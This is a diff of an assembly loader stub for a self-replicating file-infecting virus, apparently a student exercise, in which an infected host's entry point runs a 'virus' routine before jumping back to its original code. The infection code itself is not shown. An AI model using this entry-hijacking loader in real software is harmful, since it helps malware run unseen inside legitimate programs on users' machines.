@@ -6,12 +6,13 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2020/06/20 14:51:21 by ichkamo          ###   ########.fr        ;
+;    Updated: 2020/07/19 18:53:30 by ichkamo          ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
 section .text
 	global loader_entry
+	global call_virus
 	global jump_back_to_client
 	global loader_exit
 	global virus_header_struct
@@ -36,13 +37,11 @@ loader_entry:
 	push r15                   ; backup r15
 
 ;----------------------------------; launch infection routines
-	call virus
-	; call virus relative addr TODO
-
-;----------------------------------; restore state, return to client code
-return_to_client:
+call_virus:
+	call virus                 ; call virus (addr rewritten by virus)
 
 ;----------------------------------; restore registers
+return_to_client:
 	pop r15                    ; restore r15
 	pop r14                    ; restore r14
 	pop r13                    ; restore r13
@@ -58,7 +57,7 @@ return_to_client:
 	pop rcx                    ; restore rcx
 
 jump_back_to_client:
-	jmp 0xffffffff             ; jump back to entry (done by virus)
+	jmp 0xffffffff             ; jump back to entry (addr written by virus)
 loader_exit:
 
 virus_header_struct:
